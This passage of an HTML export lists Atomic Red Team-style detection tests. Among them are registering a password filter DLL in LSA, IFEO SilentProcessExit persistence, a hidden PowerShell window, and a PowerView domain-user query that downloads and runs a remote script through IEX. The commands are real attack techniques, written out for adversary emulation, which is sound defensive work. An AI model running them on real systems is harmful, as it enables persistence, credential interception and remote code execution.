<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 1620de42-160a-4fe5-bbaf-d3fef0181ce9</li>
<li><strong>name</strong>: Visual Basic script execution to gather local computer information</li>
<li><strong>description</strong>: Visual Basic execution test, execute vbscript via PowerShell.</li>
</ul>
<p>When successful, system information will be written to $env:TEMP\T1059.005.out.txt.
- <strong>platforms</strong>: ['windows']
- <strong>command</strong>: cscript "#{vbscript}" &gt; $env:TEMP\T1059.005.out.txt</p>
<ul>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{vbscript}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -ItemType Directory (Split-Path "#{vbscript}") -Force | Out-Null
Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.005/src/sys_info.vbs" -OutFile "#{vbscript}"</p>
</li>
<li><strong>cleanup_command</strong>: Remove-Item $env:TEMP\T1059.005.out.txt -ErrorAction Ignore</li>
<li><strong>mitre_id</strong>: T1059.005</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: a7961770-beb5-4134-9674-83d7e1fa865c</li>
<li><strong>name</strong>: Install and Register Password Filter DLL</li>
<li>
<p><strong>description</strong>: Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.
The binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection
Source is in src folder. 
This does require a reboot to see the filter loaded into lsass.exe. 
It does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ "PathToAtomicsFolder\T1556.002\lsa_backup.reg"
$passwordFilterName = (Copy-Item "#{dll_path}#{dll_name}" -Destination "C:\Windows\System32" -PassThru).basename
$lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
$notificationPackagesValues = $lsaKey.GetValue("Notification Packages")
$notificationPackagesValues += $passwordFilterName
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages" $notificationPackagesValues</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{dll_path}#{dll_name}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest "https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll" -OutFile "#{dll_path}#{dll_name}"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: reg.exe import "PathToAtomicsFolder\T1556.002\lsa_backup.reg"
remove-item C:\Windows\System32#{dll_name}</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1556.002</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 91580da6-bc6e-431b-8b88-ac77180005f2</li>
<li><strong>name</strong>: Install Additional Authentication Packages</li>
<li>
<p><strong>description</strong>: lsass.exe loads all DLLs specified by the Authentication Packages REG_MULTI_SZ value.
Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.
The binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection
Source is in src folder. 
This does require a reboot to see the filter loaded into lsass.exe. 
It does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ "PathToAtomicsFolder\T1556.002\lsa_backup.reg"
$passwordFilterName = (Copy-Item "#{dll_path}#{dll_name}" -Destination "C:\Windows\System32" -PassThru).basename
$lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
$AuthenticationPackagesValues = $lsaKey.GetValue("Authentication Packages")
$AuthenticationPackagesValues += $passwordFilterName
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Authentication Packages" $AuthenticationPackagesValues</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{dll_path}#{dll_name}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest "https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll" -OutFile "#{dll_path}#{dll_name}"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: reg.exe import "PathToAtomicsFolder\T1556.002\lsa_backup.reg"
remove-item C:\Windows\System32#{dll_name}</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1556.002</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: f151ee37-9e2b-47e6-80e4-550b9f999b7a</li>
<li><strong>name</strong>: Hidden Window</li>
<li>
<p><strong>description</strong>: Launch PowerShell with the "-WindowStyle Hidden" argument to conceal PowerShell windows by setting the WindowStyle parameter to hidden.
Upon execution a hidden PowerShell window will launch calc.exe</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Start-Process #{powershell_command}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1564.003</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 13117939-c9b2-4a43-999e-0a543df92f0d</li>
<li><strong>name</strong>: GlobalFlags in Image File Execution Options</li>
<li>
<p><strong>description</strong>: The following Atomic Test will create a GlobalFlag key under Image File Execution Options, also a SilentProcessExit Key with ReportingMode and MonitorProcess values. This test is similar to a recent CanaryToken that will generate an EventCode 3000 in the Application log when a command, whoami.exe for example, is executed.
Upon running Whoami.exe, a command shell will spawn and start calc.exe based on the MonitorProcess value. 
Upon successful execution, powershell will modify the registry and spawn calc.exe. An event 3000 will generate in the Application log.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li><strong>command</strong>: $Name = "GlobalFlag"
$Value = "512"
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options#{process}"
New-Item -Path $registryPath -Force
New-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force
$Name = "ReportingMode"
$Value = "1"
$SilentProcessExit = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit#{process}"
New-Item -Path $SilentProcessExit -Force
New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force </li>
</ul>
<p>$Name = "MonitorProcess"
$Value = "#{cmd_to_run}"
New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force
Start-Process whoami.exe</p>
<ul>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: $SilentProcessExit = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit#{process}" 
Remove-Item $SilentProcessExit -force
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options#{process}"
Remove-Item $registryPath -force</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1546.012</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: d6139549-7b72-4e48-9ea1-324fc9bdf88a</li>
<li><strong>name</strong>: Get-DomainUser with PowerView</li>
<li>
<p><strong>description</strong>: Utilizing PowerView, run Get-DomainUser to identify domain users. Upon execution, progress and info about users within the domain being scanned will be displayed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1558.004</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
